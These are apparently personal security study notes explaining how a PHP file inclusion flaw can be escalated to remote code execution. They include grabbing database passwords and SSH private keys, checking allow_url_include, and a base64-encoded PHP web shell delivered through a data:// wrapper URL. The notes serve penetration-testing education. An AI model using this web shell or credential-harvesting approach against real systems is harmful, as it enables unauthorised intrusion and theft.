Aside from [using PHP wrappers for file disclosures](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FFile%20Disclosures%2FUsing%20PHP%20Wrappers) through the file inclusion vulnerability. The same technique can also be used to perform code executions.

While we can use many different methods to execute remote commands depending on the backend language/framework and the vulnerable function's capabilities. The most command method for gaining control over the backend server is by enumerating for user credentials and SSH keys, and then use those to login to the backend server through SSH or any remote session.

For example, we may find the database password in `config.php`, which may match a user's password in case they re-use the same password. Or we can check the `.ssh` directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (`id_rsa`) and use it to SSH into the system.
## Data Wrapper
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. To confirm this, we need to use the `convert.base64-encode` for the `read` parameter [technique](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FFile%20Disclosures%2FUsing%20PHP%20Wrappers) to read PHP configuration files.

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On 
```
## Remote Code Execution
With `allow_url_include` enabled, we can proceed with our attack using the `data` wrapper. Aside from passing plain PHP code, we can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

First we encode our payload in Base64 as follows:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Then we pass the encoded payload into the data wrapper as follows:
```txt
http://target-website.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```